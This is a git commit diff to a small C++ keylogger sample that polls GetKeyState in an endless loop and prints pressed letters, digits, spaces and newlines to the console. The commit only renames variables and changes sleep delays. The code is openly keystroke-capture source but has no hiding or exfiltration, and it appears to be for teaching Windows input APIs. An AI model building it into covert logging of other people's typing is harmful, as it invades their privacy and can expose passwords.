7d66b9d41a565e3e2245846b5652b723dfd61b61
Pavel Yosifovich <zodiacon@live.com>
2025-04-13 14:27:26 -0400

    minor updates

--- SimpleKeyLogger/SimpleKeyLogger/SimpleKeyLogger.cpp
+++ SimpleKeyLogger/SimpleKeyLogger/SimpleKeyLogger.cpp
@@ -5,38 +5,38 @@
 #include <stdio.h>
 
 int main() {
-	char shiftNumbers[] = { ')', '!', '\"', '#', '$', '%', '^', '&', '*', '(' };
+	int delay, repeat;
+	SystemParametersInfo(SPI_GETKEYBOARDSPEED, 0, &repeat, 0);
+	SystemParametersInfo(SPI_GETKEYBOARDDELAY, 0, &delay, 0);
 
-	int delay, initialDelay;
-	SystemParametersInfo(SPI_GETKEYBOARDSPEED, 0, &delay, 0);
-	SystemParametersInfo(SPI_GETKEYBOARDDELAY, 0, &initialDelay, 0);
-
+	char numericShift[] = { ')', '!', '\"', '#', '$', '%', '^', '&', '*', '(' };
 	for (;;) {
 		bool shift = GetKeyState(VK_SHIFT) < 0;
 		bool caps = (GetKeyState(VK_CAPITAL) & 1) == 1;
+
 		for (int i = 'A'; i <= 'Z'; i++) {
-			if (GetKeyState(i) & 0x8000) {
+			if (GetKeyState(i) < 0) {
 				printf("%c", (shift ^ caps) ? i : (i | 0x20));
-				Sleep(80);
+				Sleep(50);
 				break;
 			}
 		}
 
 		if (GetKeyState(VK_SPACE) < 0) {
 			printf(" ");
-			Sleep(80);
+			Sleep(50);
 			continue;
 		}
 
 		if (GetKeyState(VK_RETURN) < 0) {
 			printf("\n");
-			Sleep(80);
+			Sleep(50);
 			continue;
 		}
 
 		for (int i = '0'; i <= '9'; i++) {
-			if (GetKeyState(i) & 0x8000) {
-				printf("%c", shift ? shiftNumbers[i - '0'] : i);
+			if (GetKeyState(i) < 0) {
+				printf("%c", shift ? numericShift[i - '0'] : i);
 				Sleep(80);
 				break;
 			}
